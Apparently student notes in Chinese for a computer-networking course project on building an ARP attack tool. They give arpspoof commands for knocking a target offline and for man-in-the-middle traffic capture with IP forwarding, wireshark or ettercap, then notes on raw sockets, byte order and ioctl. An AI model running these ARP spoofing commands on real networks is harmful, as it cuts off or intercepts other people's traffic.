# ©计算机网络PBL----ARP攻击工具编写
## 一.arp断网攻击
         spoof -i eth0 -t 网关 targetIP
## 二.arp流量转发
         echo 1 > /proc/sys/net/ipv4/i_forward
         spoof -i eth0 -t 网关 targetIP
         wireshark OR ettercap whatever
## 三.arp群体攻击
         搞不定啊
## 四.arp编程
###   1.raw socket
####     int socket(int domain,int type,int protocol);//返回sockfd描述符
         domain:协议域；常见参数：AF_INET(IPV4)|AF_INET6(IPV6);原始套接字：PF_PACKET
         type：套接字类型；常见参数：SOCK_STREAM(TCP)|SOCK_DGRAM(UDP);原始套接字：SOCK_RAW
         protocal：协议类型；常见参数：IPPROTO_TCP|IPPROTO_UDP;原始套接字:ETH_P_IP|ETH_P_ARP|ETH_P_ALL
###   2.网络字节序函数
#### 函数
         htonl()
         ntohl()
         htons()
         ntohs()
         字节序为解决大端存放和小端存放的问题
#### HBO & NBO
         NBO(网络字节序顺序)：大端模式
         HBO(主机字节序)：根据机器而定
###  3.ioctl函数
####     int ioctl(int fd,unsigned long cmd,...);//失败返回-1
         管理I/O通道的函数 获取设备信息
         fd：文件描述符
         cmd:控制命令
         ...：接收返回结果的指针
### 4.字符串转换点分十进制IP函数
